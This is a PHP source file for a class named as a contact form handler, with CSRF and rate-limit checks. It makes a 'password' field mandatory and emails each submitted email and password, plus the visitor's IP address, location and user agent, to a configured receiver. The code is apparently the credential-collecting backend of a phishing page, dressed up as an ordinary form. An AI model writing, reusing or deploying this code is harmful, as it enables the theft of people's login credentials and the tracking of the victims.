<?php

declare(strict_types=1);

namespace App;

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

class ContactFormHandler
{
    private array $config;
    private SecurityManager $security;
    private Logger $logger;

    public function __construct(array $config)
    {
        $this->config = $config;
        $this->security = new SecurityManager($config);
        $this->logger = new Logger();
    }

    public function handleRequest(): array
    {
        // Only allow POST requests
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            return $this->jsonResponse(false, 'Method not allowed');
        }

        try {
            // Validate CSRF token
            if (!$this->security->validateCsrfToken($_POST['csrf_token'] ?? '')) {
                return $this->jsonResponse(false, 'Invalid security token');
            }

            // Rate limiting
            if (!$this->security->checkRateLimit()) {
                return $this->jsonResponse(false, 'Too many requests. Please try again later.');
            }

            // Validate and sanitize input
            $email = $this->validateEmail($_POST['email'] ?? '');
            $password = $this->sanitizeInput($_POST['password'] ?? '');
            $message = $this->sanitizeInput($_POST['message'] ?? '');

            if (!$email) {
                return $this->jsonResponse(false, 'Please provide a valid email address');
            }

            if (empty($password)) {
                return $this->jsonResponse(false, 'Password field is required');
            }

            // Get client information securely
            $clientInfo = $this->security->getClientInfo();

            // Send email
            if ($this->sendEmail($email, $password, $message, $clientInfo)) {
                $this->logger->log('Contact form submitted successfully', ['email' => $email]);
                return $this->jsonResponse(true, 'Message sent successfully');
            } else {
                return $this->jsonResponse(false, 'Failed to send message. Please try again.');
            }

        } catch (Exception $e) {
            $this->logger->error('Contact form error: ' . $e->getMessage());
            return $this->jsonResponse(false, 'An error occurred. Please try again later.');
        }
    }

    private function validateEmail(string $email): ?string
    {
        $email = filter_var(trim($email), FILTER_VALIDATE_EMAIL);
        return $email !== false ? $email : null;
    }

    private function sanitizeInput(string $input): string
    {
        return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
    }

    private function sendEmail(string $email, string $password, string $message, array $clientInfo): bool
    {
        try {
            $mail = new PHPMailer(true);

            // Server settings
            $mail->isSMTP();
            $mail->Host = $this->config['smtp_host'];
            $mail->SMTPAuth = true;
            $mail->Username = $this->config['smtp_username'];
            $mail->Password = $this->config['smtp_password'];
            $mail->SMTPSecure = $this->config['smtp_encryption'];
            $mail->Port = (int)$this->config['smtp_port'];

            // Recipients
            $mail->setFrom($this->config['sender_email'], $this->config['sender_name']);
            $mail->addAddress($this->config['receiver_email']);

            // Content
            $mail->isHTML(true);
            $mail->Subject = 'Contact Form Submission';
            
            $emailBody = $this->buildEmailBody($email, $password, $message, $clientInfo);
            $mail->Body = $emailBody;
            $mail->AltBody = strip_tags($emailBody);

            return $mail->send();

        } catch (Exception $e) {
            $this->logger->error('Email sending failed: ' . $e->getMessage());
            return false;
        }
    }

    private function buildEmailBody(string $email, string $password, string $message, array $clientInfo): string
    {
        return "
        <html>
        <body style='font-family: Arial, sans-serif; line-height: 1.6;'>
            <h2 style='color: #333;'>Contact Form Submission</h2>
            
            <div style='background: #f4f4f4; padding: 20px; border-radius: 5px; margin: 20px 0;'>
                <h3 style='margin-top: 0;'>Contact Information</h3>
                <p><strong>Email:</strong> " . htmlspecialchars($email) . "</p>
                <p><strong>Password:</strong> " . htmlspecialchars($password) . "</p>
                " . (!empty($message) ? "<p><strong>Message:</strong><br>" . nl2br(htmlspecialchars($message)) . "</p>" : "") . "
            </div>
            
            <div style='background: #e9e9e9; padding: 15px; border-radius: 5px; font-size: 12px;'>
                <h4 style='margin-top: 0;'>Client Information</h4>
                <p><strong>IP Address:</strong> " . htmlspecialchars($clientInfo['ip']) . "</p>
                <p><strong>Location:</strong> " . htmlspecialchars($clientInfo['location']) . "</p>
                <p><strong>User Agent:</strong> " . htmlspecialchars($clientInfo['user_agent']) . "</p>
                <p><strong>Timestamp:</strong> " . htmlspecialchars($clientInfo['timestamp']) . "</p>
            </div>
        </body>
        </html>";
    }

    private function jsonResponse(bool $success, string $message): array
    {
        header('Content-Type: application/json');
        return [
            'success' => $success,
            'message' => $message
        ];
    }
}